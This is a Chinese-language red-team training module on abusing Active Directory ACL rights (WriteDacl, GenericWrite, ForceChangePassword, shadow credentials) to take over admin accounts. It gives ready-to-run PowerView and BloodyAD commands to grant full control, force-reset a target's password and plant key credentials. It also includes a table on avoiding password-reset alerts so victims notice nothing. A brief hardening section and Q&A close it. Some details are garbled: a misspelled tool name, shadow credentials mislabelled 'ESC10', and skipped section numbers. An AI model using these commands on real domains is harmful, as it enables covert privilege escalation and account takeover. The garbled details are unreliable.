# R08.4 目錄存取控制清單與委派權限狀態驗證 (Directory ACL & Delegated-Right State Validation)

---

## 🎯 作戰任務破題 (Tactical Objective & Mental Workflow)

**目錄存取控制清單與委派權限狀態驗證 (Active Directory ACL / ACE Abuse)** 的物理本質為**利用委派管理疏失所導致的「非對稱隱式控制權」**。在大型企業網域中，管理員常透過委派精靈 (Delegation Wizard) 將部分管理權（如重設密碼、修改群組成員）授予 Helpdesk 或服務帳號。若物件的安全性描述元 (Security Descriptor) 中存在不當配置之存取控制項目 (ACE)，攻擊者僅需持有低權限帳號，即可藉由修改 LDAP 屬性或覆寫 DACL，在不觸發端點防毒的情況下直接奪取目標物件控制權。

```
[攻擊者受控之低權限帳號: user_low] ── 發現對目標高階主管/管理員物件具備 WriteDacl
                                                │
                                                ▼ 透過 LDAP 發送 ModifyRequest 修改安全描述元
[篡改目標物件之 DACL] ──────────────────────────► 為自己新增【GenericAll (完全控制)】之 ACE！
                                                │
                                                ▼ 呼叫 User-Force-Change-Password 延伸權限
[強制覆寫目標帳號密碼 / 植入 Shadow Credential] ──► 修改其密碼或寫入 msDS-KeyCredentialLink
                                                │
                                                ▼ 使用新憑證換取合法 TGT 票證
[目標帳號完全接管] ────────────────────────────► 獲取目標特權，達成網域身分晉升！
```

## 🔬 第一動：安全描述元、ACE 結構與延伸權限解析 (Mechanics & DACL Structs)

### 1. 核心高危險 Active Directory 權限邊矩陣

| 存取權限 (Access Right) | 物理 ACE 特徵 / GUID | 攻擊破局機制 |
| :--- | :--- | :--- |
| **GenericAll** | 完全控制 (Full Control Mask) | 具備重設密碼、寫入任意屬性、修改物件成員之全權能力 |
| **WriteDacl** | `WRITE_DACL` 存取遮罩 | 具備修改目標物件存取控制清單之權利，可直接賦予自己 `GenericAll` |
| **WriteOwner** | `WRITE_OWNER` 存取遮罩 | 可將目標物件之擁有者 (Owner) 變更為自己，再以擁有者身分修改 DACL |
| **ForceChangePassword** | `00299570-246d-11d0-a768-00aa006e0529` | 即使不知道原密碼，亦能直接透過 LDAP 強制重設目標使用者密碼 |
| **GenericWrite** | 具備寫入任意受保護屬性能力 | 寫入 `scriptPath` 劫持登入腳本，或寫入 `msDS-AllowedToDelegateTo` |
| **WriteKeyCredentialLink**| 寫入 `msDS-KeyCredentialLink` | 執行 **Shadow Credentials (ESC10)**：植入攻擊者私鑰並以 PKINIT 獲取 TGT |

## ⚡ 第二動：戰術執行與工具鏈操作 (Attack Vectors & Automation)

### 1. 核心 ACL 枚舉與權限濫用指令速查表 (PowerView / BloodyAD)

```bash
# 1. 查詢當前帳號對網域內所有物件具備之高危 ACE 權限 (PowerView)
Get-DomainObjectAcl -Identity "TargetAdmin" -ResolveGUIDs | ? { $_.ActiveDirectoryRights -match "GenericAll|WriteDacl|WriteOwner" }

# 2. 濫用 WriteDacl 為自己新增完全控制權 (PowerView)
Add-DomainObjectAcl -TargetIdentity "TargetAdmin" -PrincipalIdentity "user_low" -Rights All

# 3. 跨平台利用 BloodyAD 執行強制重設密碼 (無需端點二進位工具)
bloodyAD -u "user_low" -p "Password123!" -d corp.internal --host 10.0.0.1 \
    set password "TargetAdmin" "NewStrongPassw0rd!"

# 4. 濫用 GenericWrite 執行 Shadow Credentials (無密碼重設告警)
# 生成自簽憑證並將金鑰寫入目標帳號屬性
pywhiskey -u "user_low" -p "Password123!" -d corp.internal --target "TargetAdmin" --action add
```

### 1. 權限濫用特徵消減與靜默作戰表

| 規避面向 | 原始高危特徵 | 靜默規避技術 | 原理解析 |
| :--- | :--- | :--- | :--- |
| **密碼重設告警** | 觸發 Event 4724 (嘗試重設帳號密碼) | 改採 **Shadow Credentials** 寫入 KeyCredentialLink | 完全不變更使用者原密碼，受害者毫無感知 |

## 🛡️ 第五動：工程級防禦基線 (Hardening Baselines)

1. **最小化委派原則 (Principle of Least Privilege Delegation)**：
   - 杜絕使用「委派控制精靈」勾選「完全控制」；精確委派至特定屬性 (如僅允許寫入電話號碼)。
2. **定期執行 SDDL 語法安全稽核**：
   - 使用 `dsacls` 或自動化腳本定期審查關鍵物件（OU、Admin 帳號）之安全描述元，移除孤立 SID 與過度寬鬆 ACE。
3. **AdminSDHolder 保護對象完整性**：
   - 確保所有特權帳號之 `adminCount` 為 1，且未關閉繼承旗標，防止惡意繼承 ACE 污染。

## 🧪 實戰演練環境搭建 (Environment & Lab Setup)

### 1. 極簡 ACL 委派弱點枚舉模擬腳本 (Python, 20 行)
```python
# acl_checker.py
from ldap3 import Server, Connection, ALL
import sys

server = Server("127.0.0.1", get_info=ALL)
conn = Connection(server, user="corp\\user_low", password="Password123!", auto_bind=True)

# 查詢目標使用者物件之 nTSecurityDescriptor
conn.search(search_base="CN=TargetAdmin,CN=Users,DC=corp,DC=internal",
            search_filter="(objectClass=*)",
            attributes=["nTSecurityDescriptor", "sAMAccountName"])

if conn.entries:
    sd = conn.entries[0].nTSecurityDescriptor
    print(f"[*] 成功讀取目標物件 {conn.entries[0].sAMAccountName} 之安全描述元")
    print(f"[!] 具備讀取權限，可進一步解析 ACE 是否包含 WriteDacl / GenericAll 漏洞！")
else:
    print("[-] 無法讀取安全描述元")
```

## 🎯 作戰驗收檢查點 (Operational Checkpoints)

- [ ] **Q1：WriteOwner 與 WriteDacl 兩種權限在提權邏輯上有何微妙先後順序？**
  - **戰術思維**：`WriteDacl` 允許直接修改物件的存取控制清單；而 `WriteOwner` 僅允許將物件擁有者改為自己，但一旦成為擁有者，Windows 核心即賦予其隱式修改 DACL 的權利，因此兩者皆可 100% 轉化為完全控制。
- [ ] **Q2：為何 Shadow Credentials 比傳統的 ForceChangePassword 具備更高的隱蔽性？**
  - **戰術思維**：傳統重設密碼會破壞目標使用者的原有憑證，導致受害者登入失敗而迅速報案；Shadow Credentials 是在目標屬性中新增一組公鑰憑證，受害者原密碼完全不變，紅隊隨時可用該憑證透過 PKINIT 換取 TGT。
- [ ] **Q3：在 Active Directory 中，GenericWrite 對電腦物件 (Computer Object) 最致命的利用為何？**
  - **戰術思維**：若對電腦物件具備 `GenericWrite`，可修改其 `msDS-AllowedToActOnBehalfOfOtherIdentity` 屬性，配置**基於資源的限制性委派 (RBCD)**，進而以任意身分獲取該電腦的本機管理者權限。
- [ ] **Q4：委派精靈 (Delegation Wizard) 預設產生的「重設使用者密碼」權限是否具備危險性？**
  - **戰術思維**：具備高度危險性。若委派的範圍是整個 OU，且該 OU 內包含具備其他高權限服務的帳號，低權限管理員即可藉由重設其密碼進一步擴大戰果。
- [ ] **Q5：為何微軟的 AdminSDHolder 機制每 60 分鐘會重置一次受保護物件的 DACL？**
  - **戰術思維**：為了防止特權群組與帳號因人為疏失或惡意攻擊被附加危險 ACE。SDProp 行程每小時定期運行，將 AdminSDHolder 物件的標準 DACL 強制覆寫回所有特權物件，並切斷其 ACL 繼承。
